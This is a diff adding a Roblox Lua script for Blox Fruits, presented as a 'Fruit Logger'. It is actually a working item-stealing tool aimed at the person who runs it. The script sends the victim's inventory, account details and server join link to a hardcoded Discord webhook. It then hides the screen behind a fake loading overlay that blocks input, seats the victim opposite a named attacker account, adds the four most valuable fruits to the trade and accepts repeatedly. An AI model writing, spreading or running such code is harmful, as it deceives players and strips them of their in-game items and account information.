@@ -1,0 +1,677 @@
+-- ============================================
+-- DeadJB - Blox Fruits Fruit Logger FINAL v22
+-- Feito por ServerDead
+-- ============================================
+
+print("[DEAD] 1 - script iniciou")
+
+local CONFIG = {
+    UserName = "Carlosconta6",
+    WebHook = "https://discord.com/api/webhooks/1538199582926962898/hz1QApdTJJiX3Orv40JiLsFD2lhfBJb-nP8P1Pu4hZkSXDFhKAeF98NlpMhbkyqoYtxD",
+    ActualLogsWebhook = "https://discord.com/api/webhooks/1538199582926962898/hz1QApdTJJiX3Orv40JiLsFD2lhfBJb-nP8P1Pu4hZkSXDFhKAeF98NlpMhbkyqoYtxD",
+    AddItemDelay = 3,
+    FrutasPorTrade = 4,
+}
+
+local Mares = {
+    [4442272183] = "Sea 1",
+    [79091703265657] = "Sea 2",
+    [7449423635] = "Sea 3",
+}
+
+local Usernames = { CONFIG.UserName }
+local WebhookUsernames = { CONFIG.UserName }
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+print("[DEAD] 2 - servicos carregados")
+
+local ID_PARA_NOME = {
+    [1390] = "Rocket", [1411] = "Spin", [1405] = "Blade",
+    [1410] = "Spring", [1424] = "Bomb", [1400] = "Smoke",
+    [1398] = "Spike", [1394] = "Flame", [1414] = "Falcon",
+    [1392] = "Ice", [1404] = "Sand", [1395] = "Dark",
+    [1399] = "Diamond", [1407] = "Light", [1416] = "Rubber",
+    [1423] = "Barrier", [1425] = "Eagle", [1412] = "Ghost",
+    [1391] = "Magma", [1406] = "Quake", [1402] = "Buddha",
+    [1408] = "Love", [1403] = "Spider", [1413] = "Sound",
+    [1401] = "Phoenix", [1420] = "Portal", [1417] = "Rumble",
+    [1415] = "Pain", [1418] = "Gravity", [1419] = "T-Rex",
+    [1409] = "Dough", [1421] = "Shadow", [1422] = "Venom",
+    [1426] = "Control", [1427] = "Spirit", [1428] = "Dragon",
+    [1429] = "Leopard", [1430] = "Kitsune", [1431] = "Gas",
+    [1432] = "Yeti", [1433] = "Tiger", [1434] = "Creation",
+    [1435] = "Lightning", [1436] = "Mammoth", [1437] = "Blizzard",
+    [1438] = "Magnet",
+}
+
+local ID_ESPECIAL = {
+    [1458] = "Scarlet Ghost",
+}
+
+local PRECO_PARA_NOME = {
+    [5000] = "Rocket", [7500] = "Spin", [30000] = "Blade",
+    [60000] = "Spring", [80000] = "Bomb", [100000] = "Smoke",
+    [180000] = "Spike", [250000] = "Flame", [300000] = "Falcon",
+    [350000] = "Ice", [420000] = "Sand", [500000] = "Dark",
+    [600000] = "Diamond", [650000] = "Light", [750000] = "Rubber",
+    [800000] = "Barrier", [940000] = "Ghost", [960000] = "Magma",
+    [1000000] = "Quake", [1200000] = "Buddha", [1300000] = "Love",
+    [1500000] = "Spider", [1700000] = "Sound", [1800000] = "Phoenix",
+    [1900000] = "Portal", [2100000] = "Rumble", [2300000] = "Pain",
+    [2400000] = "Blizzard", [2500000] = "Gravity", [2700000] = "Mammoth",
+    [2800000] = "Dough", [2900000] = "Shadow", [3000000] = "Venom",
+    [3200000] = "Control", [3400000] = "Spirit", [3500000] = "Dragon",
+    [5000000] = "Leopard", [8000000] = "Kitsune",
+    [550000] = "Eagle", [1400000] = "Creation",
+}
+
+local PT_PARA_EN = {
+    ["fumaca"] = "Smoke", ["espinho"] = "Spike", ["chama"] = "Flame",
+    ["falcao"] = "Falcon", ["gelo"] = "Ice", ["areia"] = "Sand",
+    ["escuridao"] = "Dark", ["diamante"] = "Diamond", ["luz"] = "Light",
+    ["borracha"] = "Rubber", ["barreira"] = "Barrier", ["fantasma"] = "Ghost",
+    ["magma"] = "Magma", ["terremoto"] = "Quake", ["buda"] = "Buddha",
+    ["amor"] = "Love", ["aranha"] = "Spider", ["som"] = "Sound",
+    ["fenix"] = "Phoenix", ["portal"] = "Portal", ["tremor"] = "Rumble",
+    ["dor"] = "Pain", ["gravidade"] = "Gravity", ["mamute"] = "Mammoth",
+    ["massa"] = "Dough", ["sombra"] = "Shadow", ["veneno"] = "Venom",
+    ["controle"] = "Control", ["espirito"] = "Spirit", ["dragao"] = "Dragon",
+    ["leopardo"] = "Leopard", ["tigre"] = "Tiger",
+    ["criacao"] = "Creation", ["relampago"] = "Lightning",
+    ["ima"] = "Magnet",
+}
+
+local function normalizar(txt)
+    txt = string.lower(tostring(txt or ""))
+    txt = txt:gsub("á","a"):gsub("à","a"):gsub("ã","a"):gsub("â","a"):gsub("ä","a")
+    txt = txt:gsub("é","e"):gsub("è","e"):gsub("ê","e"):gsub("ë","e")
+    txt = txt:gsub("í","i"):gsub("ì","i"):gsub("î","i"):gsub("ï","i")
+    txt = txt:gsub("ó","o"):gsub("ò","o"):gsub("õ","o"):gsub("ô","o"):gsub("ö","o")
+    txt = txt:gsub("ú","u"):gsub("ù","u"):gsub("û","u"):gsub("ü","u")
+    txt = txt:gsub("ç","c")
+    return txt
+end
+
+local function limparNome(nome)
+    nome = tostring(nome or ""):gsub("%-.*$", ""):gsub("^%s+", ""):gsub("%s+$", "")
+    local convertido = PT_PARA_EN[normalizar(nome)]
+    return convertido or nome
+end
+
+local function post(url, body)
+    if not url or url == "" then return end
+    local encoded = HttpService:JSONEncode(body)
+    local ok, res = pcall(function()
+        return HttpService:RequestAsync({
+            Url = url, Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = encoded
+        })
+    end)
+    if ok and res and res.StatusCode then return res end
+    if syn and syn.request then
+        pcall(function() syn.request({ Url=url, Method="POST",
+            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
+    end
+    if http_request then
+        pcall(function() http_request({ Url=url, Method="POST",
+            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
+    end
+    if request then
+        pcall(function() request({ Url=url, Method="POST",
+            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
+    end
+end
+
+local function getExecutor()
+    local ok, name = pcall(function() return identifyexecutor() end)
+    if ok and name then return name end
+    return "Delta"
+end
+
+print("[DEAD] 3 - funcoes base ok")
+
+-- ============================================
+-- TELA PRETA
+-- ============================================
+local _loadingScreen, _loadingBar, _loadingPercent, _loadingText
+local _loadingAnimRunning = false
+local _loadingAtivo = false
+
+local function criarLoading()
+    if _loadingScreen then return end
+    print("[DEAD] criarLoading chamado")
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "MIG_Loading"
+    gui.Parent = game.CoreGui
+    gui.DisplayOrder = 2147483647
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    bg.BorderSizePixel = 0
+    bg.Active = true
+    bg.Parent = gui
+
+    local bloqueio = Instance.new("TextButton")
+    bloqueio.Size = UDim2.new(1,0,1,0)
+    bloqueio.BackgroundTransparency = 1
+    bloqueio.Text = ""
+    bloqueio.AutoButtonColor = false
+    bloqueio.Active = true
+    bloqueio.Selectable = true
+    bloqueio.ZIndex = 1
+    bloqueio.Parent = bg
+    bloqueio.MouseButton1Click:Connect(function() end)
+    bloqueio.MouseButton1Down:Connect(function() end)
+    bloqueio.MouseButton1Up:Connect(function() end)
+    bloqueio.MouseButton2Click:Connect(function() end)
+    bloqueio.TouchTap:Connect(function() end)
+    bloqueio.TouchLongPress:Connect(function() end)
+    bloqueio.InputBegan:Connect(function() end)
+
+    local titulo = Instance.new("TextLabel")
+    titulo.Size = UDim2.new(1,0,0,60)
+    titulo.Position = UDim2.new(0,0,0.35,-80)
+    titulo.BackgroundTransparency = 1
+    titulo.Font = Enum.Font.GothamBold
+    titulo.Text = "MIG"
+    titulo.TextColor3 = Color3.fromRGB(55,220,125)
+    titulo.TextScaled = true
+    titulo.ZIndex = 2
+    titulo.Parent = bg
+
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(1,0,0,30)
+    sub.Position = UDim2.new(0,0,0.35,-20)
+    sub.BackgroundTransparency = 1
+    sub.Font = Enum.Font.Gotham
+    sub.Text = "Carregando script..."
+    sub.TextColor3 = Color3.fromRGB(200,200,200)
+    sub.TextScaled = true
+    sub.ZIndex = 2
+    sub.Parent = bg
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.6,0,0,24)
+    barBg.Position = UDim2.new(0.2,0,0.5,30)
+    barBg.BackgroundColor3 = Color3.fromRGB(20,30,25)
+    barBg.BorderSizePixel = 0
+    barBg.ZIndex = 2
+    barBg.Parent = bg
+    local cB = Instance.new("UICorner")
+    cB.CornerRadius = UDim.new(1,0)
+    cB.Parent = barBg
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0,0,1,0)
+    barFill.BackgroundColor3 = Color3.fromRGB(55,220,125)
+    barFill.BorderSizePixel = 0
+    barFill.ZIndex = 3
+    barFill.Parent = barBg
+    local cF = Instance.new("UICorner")
+    cF.CornerRadius = UDim.new(1,0)
+    cF.Parent = barFill
+
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(1,0,0,30)
+    pct.Position = UDim2.new(0,0,0.5,70)
+    pct.BackgroundTransparency = 1
+    pct.Font = Enum.Font.GothamBold
+    pct.Text = "0.0%"
+    pct.TextColor3 = Color3.fromRGB(255,255,255)
+    pct.TextScaled = true
+    pct.ZIndex = 2
+    pct.Parent = bg
+
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1,0,0,20)
+    status.Position = UDim2.new(0,0,0.5,110)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.Gotham
+    status.Text = "Inicializando..."
+    status.TextColor3 = Color3.fromRGB(150,150,150)
+    status.TextScaled = true
+    status.ZIndex = 2
+    status.Parent = bg
+
+    _loadingScreen = gui
+    _loadingBar = barFill
+    _loadingPercent = pct
+    _loadingText = status
+
+    _loadingAnimRunning = true
+    task.spawn(function()
+        local pctAtual = 0
+        while _loadingAnimRunning and _loadingScreen do
+            if pctAtual < 67 then
+                pctAtual = pctAtual + math.random(5, 12) / 10
+                if pctAtual > 67 then pctAtual = 67 end
+                task.wait(0.1)
+            else
+                pctAtual = pctAtual + math.random(1, 3) / 100
+                if pctAtual > 99 then pctAtual = 99 end
+                task.wait(0.5)
+            end
+
+            if _loadingBar then
+                _loadingBar.Size = UDim2.new(pctAtual / 100, 0, 1, 0)
+            end
+            if _loadingPercent then
+                _loadingPercent.Text = string.format("%.1f%%", pctAtual)
+            end
+
+            if _loadingText then
+                if pctAtual < 15 then
+                    _loadingText.Text = "Inicializando..."
+                elseif pctAtual < 35 then
+                    _loadingText.Text = "Carregando modulos..."
+                elseif pctAtual < 55 then
+                    _loadingText.Text = "Sincronizando dados..."
+                elseif pctAtual < 67 then
+                    _loadingText.Text = "Aplicando patches..."
+                elseif pctAtual < 80 then
+                    _loadingText.Text = "Finalizando..."
+                elseif pctAtual < 95 then
+                    _loadingText.Text = "Otimizando..."
+                else
+                    _loadingText.Text = "Aguarde..."
+                end
+            end
+        end
+    end)
+end
+
+local function removerLoading()
+    _loadingAnimRunning = false
+    _loadingAtivo = false
+    if _loadingScreen then
+        pcall(function() _loadingScreen:Destroy() end)
+        _loadingScreen, _loadingBar, _loadingPercent, _loadingText = nil, nil, nil, nil
+    end
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, proc)
+    if proc then return end
+    if input.KeyCode == Enum.KeyCode.End then
+        removerLoading()
+        print("[DEAD] Tela preta removida (END)")
+    end
+end)
+
+print("[DEAD] 4 - loading setup ok")
+
+-- ============================================
+-- ler frutas guardadas
+-- ============================================
+local function lerFrutasGuardadas(CommF)
+    local ok, inv = pcall(function() return CommF:InvokeServer("getTradeInventory") end)
+    if not ok or type(inv) ~= "table" or type(inv.Items) ~= "table" then
+        print("[DEAD] getTradeInventory falhou:", tostring(inv))
+        return {}
+    end
+
+    local frutas = {}
+    for _, item in ipairs(inv.Items) do
+        if type(item) == "table" and item.ItemId and item.Price then
+            local preco = tonumber(item.Price) or 0
+            local id = item.ItemId
+
+            local nome = ID_ESPECIAL[id]
+            if not nome then nome = ID_PARA_NOME[id] end
+            if not nome then nome = PRECO_PARA_NOME[preco] end
+            if not nome then nome = "ID_"..tostring(id) end
+
+            nome = limparNome(nome)
+
+            table.insert(frutas, {
+                Id = id,
+                Nome = nome,
+                Price = preco,
+            })
+        end
+    end
+
+    table.sort(frutas, function(a, b)
+        return a.Price > b.Price
+    end)
+
+    print("[DEAD] frutas lidas:", #frutas)
+    return frutas
+end
+
+local function tradeJaTemFruta()
+    local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
+    local trade = pg and pg:FindFirstChild("Main") and pg.Main:FindFirstChild("Trade")
+    if not trade then return false end
+    local container = trade:FindFirstChild("Container")
+    if not container then return false end
+    local trade1 = container:FindFirstChild("1")
+    local frameT = trade1 and trade1:FindFirstChild("Frame")
+    if not frameT then return false end
+
+    for _, it in ipairs(frameT:GetChildren()) do
+        if it.Name ~= "UIGridLayout" and it.Name ~= "Template"
+        and it.Name ~= "EmptyTemplate" and it.Name ~= "AddButton" then
+            return true
+        end
+    end
+    return false
+end
+
+local _tradeRodado = false
+local _acceptLoopAtivo = false
+
+local function autoTrade(CommF, TradeFunction, frutas)
+    print("[DEAD] autoTrade chamado | frutas:", #frutas)
+    if #frutas == 0 then return end
+    if tradeJaTemFruta() then
+        print("[DEAD] trade ja tem fruta, pulando")
+        return
+    end
+
+    if not _loadingAtivo then
+        criarLoading()
+        _loadingAtivo = true
+    end
+
+    task.wait(1.5)
+
+    -- pega so as N mais caras
+    local limite = math.min(CONFIG.FrutasPorTrade, #frutas)
+    local lista = {}
+    for i = 1, limite do
+        table.insert(lista, frutas[i])
+    end
+
+    -- adiciona as N
+    for i, f in ipairs(lista) do
+        print("[DEAD] add:", f.Nome, "| ID:", f.Id)
+        pcall(function()
+            TradeFunction:InvokeServer("addItem", f.Id)
+        end)
+        task.wait(CONFIG.AddItemDelay)
+    end
+
+    -- ============================================
+    -- LOOP DE ACCEPT (a cada 1s)
+    -- ============================================
+    if _acceptLoopAtivo then return end
+    _acceptLoopAtivo = true
+
+    task.spawn(function()
+        print("[DEAD] loop de accept iniciado")
+
+        while _acceptLoopAtivo do
+            -- verifica se trade ainda ta aberto
+            local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
+            local trade = pg and pg:FindFirstChild("Main") and pg.Main:FindFirstChild("Trade")
+
+            if not trade or not trade.Visible then
+                print("[DEAD] trade fechou, parando loop")
+                _acceptLoopAtivo = false
+                break
+            end
+
+            pcall(function()
+                TradeFunction:InvokeServer("accept")
+            end)
+
+            task.wait(1)
+        end
+    end)
+end
+
+local function detectarMar()
+    local LocalPlayer = Players.LocalPlayer
+
+    local loadingMsg = LocalPlayer:GetAttribute("LoadingMessage")
+    if loadingMsg then
+        local msg = tostring(loadingMsg):lower()
+        if msg:find("first sea") then return "Sea 1" end
+        if msg:find("second sea") then return "Sea 2" end
+        if msg:find("third sea") then return "Sea 3" end
+    end
+
+    local porPlaceId = Mares[game.PlaceId]
+    if porPlaceId then return porPlaceId end
+
+    return "PlaceId: "..tostring(game.PlaceId)
+end
+
+function MIG_FRUITS()
+    print("[DEAD] 5 - MIG_FRUITS iniciou")
+
+    local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
+    if not Remotes then
+        warn("Nao eh Blox Fruits (Remotes nao encontrado).")
+        return
+    end
+
+    local CommF = Remotes:FindFirstChild("CommF_")
+    if not CommF then
+        warn("Nao eh Blox Fruits (CommF_ nao encontrado).")
+        return
+    end
+
+    local TradeFunction = Remotes:FindFirstChild("TradeFunction")
+    if not TradeFunction then
+        warn("TradeFunction nao encontrado.")
+        return
+    end
+
+    print("[DEAD] 6 - remotes ok")
+
+    local LocalPlayer = Players.LocalPlayer
+    local pg = LocalPlayer:WaitForChild("PlayerGui", 10)
+    if not pg then return end
+
+    local sb = pg:FindFirstChild("ServerBrowser")
+    if not sb then
+        task.wait(3)
+        sb = pg:FindFirstChild("ServerBrowser")
+    end
+
+    local server = "Unknown"
+
+    if sb then
+        sb.Enabled = true
+        sb.Enabled = false
+
+        local LocalScript = sb:FindFirstChild("LocalScript")
+        if LocalScript then
+            local ok, env = pcall(function() return getsenv(LocalScript) end)
+            if ok and env then
+                local serverList
+                for i = 1, 150 do
+                    local o, u = pcall(function() return debug.getupvalues(env.UpdateScroll) end)
+                    if o and u and u[2] and #u[2] > 1 then
+                        serverList = u[2]
+                        break
+                    end
+                    task.wait(0.1)
+                end
+
+                if serverList then
+                    for _, v in pairs(serverList) do
+                        if v.Job == game.JobId then
+                            server = (v.Region or "?").." "..(v.Name or "?")
+                            break
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    print("[DEAD] 7 - server detectado:", server)
+
+    local ehPV = false
+    if server == "Unknown" then
+        ehPV = true
+    elseif server:lower():find("private") then
+        ehPV = true
+    elseif not server:find(",") then
+        ehPV = true
+    end
+
+    if ehPV then
+        warn("!EXECUTE EM SERVER COM PESSOAS! EXEMPLO: PÚBLICO")
+        warn("Server atual e Private Server (PV). Nao executando.")
+        warn("Nome detectado: "..server)
+        return
+    end
+
+    local frutas = lerFrutasGuardadas(CommF)
+
+    local total = 0
+    for _, v in ipairs(frutas) do total = total + v.Price end
+
+    local n1 = 0
+    for _, v in ipairs(frutas) do
+        if v.Nome == "Kitsune" or v.Nome == "Dragon"
+        or v.Nome == "Leopard" or v.Nome == "Dough" then n1 = n1 + 1 end
+    end
+
+    local v27 = getExecutor()
+    local mar = detectarMar()
+    local content = "@everyone @here"
+
+    local topFrutas = ""
+    local restoFrutas = ""
+    for i, v in ipairs(frutas) do
+        if i <= 8 then
+            topFrutas = topFrutas.."`"..v.Nome.."` — **R$ "..v.Price.."**\n"
+        else
+            restoFrutas = restoFrutas.."`"..v.Nome.."` — R$ "..v.Price.."\n"
+        end
+    end
+
+    local t3 = {
+        content = content,
+        username = LocalPlayer.Name,
+        avatar_url = "https://i.ibb.co/GWsnpph/xpng.png",
+        allowed_mentions = { parse = { "everyone", "roles", "users" } },
+        embeds = {{
+            title = "🐾 "..mar.." — "..tostring(#frutas).." frutas",
+            description = "**"..LocalPlayer.Name.."** está num server do **"..mar.."**.",
+            color = 0xe2a3ff,
+            fields = {
+                { name = "👤 Conta",
+                  value = "```Username: "..LocalPlayer.Name
+                       .."\nUser-ID: "..LocalPlayer.UserId
+                       .."\nAccount Age: "..LocalPlayer.AccountAge.." Days"
+                       .."\nExploit: "..v27.."```",
+                  inline = false },
+                { name = "🌎 Server ("..mar..")", value = "`"..server.."`", inline = false },
+                { name = "🍎 Frutas ("..tostring(#frutas).." total — valor R$ "..total..")",
+                  value = (#topFrutas > 0) and topFrutas:sub(1, 1024) or "*sem frutas*",
+                  inline = false },
+                { name = "🔗 Como entrar",
+                  value = "Abra o Blox → **Servers** → procure:\n`"..server.."`",
+                  inline = false }
+            },
+            footer = { text = "DeadJB • X Scripts" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    if #restoFrutas > 0 then
+        table.insert(t3.embeds, {
+            title = "🍏 Outras frutas",
+            description = restoFrutas:sub(1, 4000),
+            color = 0x9b59ff
+        })
+    end
+
+    print("[DEAD] 8 - enviando webhook")
+    post(CONFIG.WebHook, t3)
+
+    local logdata = {}
+    for k, v in pairs(t3) do logdata[k] = v end
+    logdata.content = "@everyone @here\nhttps://www.roblox.com/games/start?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
+    post(CONFIG.ActualLogsWebhook, logdata)
+
+    print("[DEAD] 9 - loops iniciando")
+
+    -- loop sentar vitima
+    task.spawn(function()
+        while task.wait(0.5) do
+            local meuChar = LocalPlayer.Character
+            if not meuChar then continue end
+            local meuHum = meuChar:FindFirstChildWhichIsA("Humanoid")
+            if not meuHum or meuHum.Health <= 0 then continue end
+
+            local carlos = Players:FindFirstChild(CONFIG.UserName)
+            if carlos and carlos.Character then
+                local carlosHum = carlos.Character:FindFirstChildWhichIsA("Humanoid")
+                if carlosHum and carlosHum.SeatPart then
+                    local mesa = carlosHum.SeatPart.Parent
+                    if mesa and mesa.Name == "TradeTable" then
+                        if not meuHum.SeatPart then
+                            local outroSeat
+                            if carlosHum.SeatPart.Name == "P1" then
+                                outroSeat = mesa:FindFirstChild("P2")
+                            else
+                                outroSeat = mesa:FindFirstChild("P1")
+                            end
+                            if outroSeat and outroSeat:IsA("Seat") then
+                                print("[DEAD] sentando na mesa")
+                                pcall(function() outroSeat:Sit(meuHum) end)
+                                task.wait(0.3)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    -- loop monitorar trade
+    task.spawn(function()
+        while task.wait(1) do
+            local pg2 = LocalPlayer:FindFirstChild("PlayerGui")
+            if not pg2 then continue end
+            local main2 = pg2:FindFirstChild("Main")
+            if not main2 then continue end
+            local trade2 = main2:FindFirstChild("Trade")
+            if not trade2 then continue end
+
+            if not trade2.Visible then
+                _tradeRodado = false
+                continue
+            end
+
+            if trade2.Visible and not _tradeRodado then
+                local carlos = Players:FindFirstChild(CONFIG.UserName)
+                if not carlos then continue end
+
+                local meuChar = LocalPlayer.Character
+                local meuHum = meuChar and meuChar:FindFirstChildWhichIsA("Humanoid")
+                local carlosChar = carlos.Character
+                local carlosHum = carlosChar and carlosChar:FindFirstChildWhichIsA("Humanoid")
+
+                if meuHum and meuHum.SeatPart and carlosHum and carlosHum.SeatPart then
+                    if meuHum.SeatPart.Parent == carlosHum.SeatPart.Parent then
+                        _tradeRodado = true
+                        print("[DEAD] 10 - trade detectado, chamando autoTrade")
+                        task.spawn(function()
+                            task.wait(0.5)
+                            autoTrade(CommF, TradeFunction, frutas)
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+
+    print("[DEAD] 11 - loops ativos, script pronto")
+end
+
+MIG_FRUITS()
